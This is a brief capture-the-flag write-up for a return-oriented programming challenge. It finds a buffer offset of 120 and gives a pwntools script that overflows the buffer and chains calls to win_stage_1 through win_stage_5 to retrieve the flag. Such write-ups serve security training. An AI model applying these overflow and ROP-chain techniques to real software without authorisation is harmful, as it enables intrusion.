# Return Oriented Programming 3.0

Running the provided executable file, we are tasked to jump to `win_stage_1` with arguments 1, then jump to `win_stage_2` with parameter `2`, until `win_stage_5`. First, using the De'Bruijn sequence, we found that the offset is 120. Next, i use the `rop` function from `pwn` to simplify the payload.

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyrop_level3.0")

io = process()

print("===== STARTING EXPLOIT =====")

offset = 120

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.win_stage_1(0x1)
rop.win_stage_2(0x2)
rop.win_stage_3(0x3)
rop.win_stage_4(0x4)
rop.win_stage_5(0x5)

io.sendline(rop.chain())

io.recvuntil(b'Leaving!\n')

print(f'Flag: {io.recvline(False)}')
```

Flag:

![[Return Oriented Programming/images/Level3.0.png]]
